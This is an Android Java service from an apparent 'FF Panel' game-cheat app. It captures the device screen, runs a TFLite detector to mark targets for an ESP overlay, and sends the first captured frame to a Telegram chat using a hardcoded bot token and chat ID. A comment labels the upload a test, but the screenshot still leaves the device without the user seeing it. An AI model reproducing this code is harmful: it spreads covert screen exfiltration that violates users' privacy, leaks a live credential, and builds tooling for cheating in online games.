package com.ff.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.RectF;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.DisplayMetrics;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.List;

public class ScreenCaptureService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private TFLiteHelper tfliteHelper;
    private int screenWidth, screenHeight, screenDensity;
    private boolean isFirstFrame = true;
    
    String BOT_TOKEN = "8271233765:AAFhLm-6blikop6XyQgxLJsr-SXO0Rah_yw";
    String CHAT_ID = "8866735801";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            Notification notification = buildNotification();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, 0x00000004); // FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            } else {
                startForeground(1, notification);
            }
            
            tfliteHelper = new TFLiteHelper(this);

            int resultCode = intent.getIntExtra("resultCode", 0);
            Intent data = intent.getParcelableExtra("data");

            MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            mediaProjection = manager.getMediaProjection(resultCode, data);

            DisplayMetrics metrics = getResources().getDisplayMetrics();
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;

            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("FF_Capture",
                    screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);
                            
                            // TEST KE LIYE: Pehla frame Telegram par bhejo
                            if (isFirstFrame) {
                                sendTestScreenshot(bitmap);
                                isFirstFrame = false;
                            }
                            
                            if (tfliteHelper != null) {
                                List<RectF> targets = tfliteHelper.detectObjects(bitmap);
                                if (targets != null && !targets.isEmpty()) {
                                    OverlayService.updateTargets(targets);
                                }
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        if (image != null) image.close();
                    }
                }
            }, new Handler());

        } catch (Exception e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }

    private void sendTestScreenshot(Bitmap bitmap) {
        try {
            File f = new File(getCacheDir(), "test_screen.jpg");
            FileOutputStream fos = new FileOutputStream(f);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos);
            fos.close();

            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + f.getName() + "\"" + lineEnd);
            request.writeBytes(lineEnd);

            FileInputStream fis = new FileInputStream(f);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                request.write(buffer, 0, bytesRead);
            }
            fis.close();
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush();
            request.close();
            conn.getResponseCode();
        } catch (Exception e) {}
    }

    private Notification buildNotification() {
        String channelId = "ff_capture";
        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "FF Panel", NotificationManager.IMPORTANCE_LOW);
            manager.createNotificationChannel(channel);
        }
        
        Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) 
                ? new Notification.Builder(this, channelId) 
                : new Notification.Builder(this);
                
        return builder.setContentTitle("FF Panel Running")
                .setContentText("ESP is active.")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
    }

    @Override
    public void onDestroy() {
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
        if (tfliteHelper != null) tfliteHelper.close();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}